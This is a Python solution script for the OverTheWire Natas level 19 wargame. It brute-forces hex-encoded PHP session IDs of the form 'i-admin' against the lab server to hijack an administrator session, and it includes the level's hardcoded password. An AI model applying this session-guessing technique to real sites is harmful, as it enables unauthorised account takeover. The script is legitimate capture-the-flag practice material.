import requests

url = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"  #Password for Natas19

loginUsr = "admin"
loginPass = "Password shouldn't matter"

data = {"username": loginUsr, "password": loginPass}

"""
Logic:
We run the loop 640 times - while setting the cookie value to:
hex_encoded(i-admin) -- where 'i' is the counter for the loop
"""

# Loop
for i in range(1, 641):
   
    # Convert ascii to hex cookie value
    sessionID = f'{i}-admin'.encode().hex()

    cookie = {'PHPSESSID': sessionID}
    
    # Send the request
    response = requests.post(url, auth=(username, password), data=data, cookies=cookie)
    print(f'Loop: {i}\tTrying SessionID: {sessionID}')

    # Check if we got the right sesionID, if no continue:
    if "You are logged in as a regular user." not in response.text:
        # print(response.text)
        print(f"Correct Session ID: {sessionID}")
        break
        
# print(f"Final password: {extracted_password}")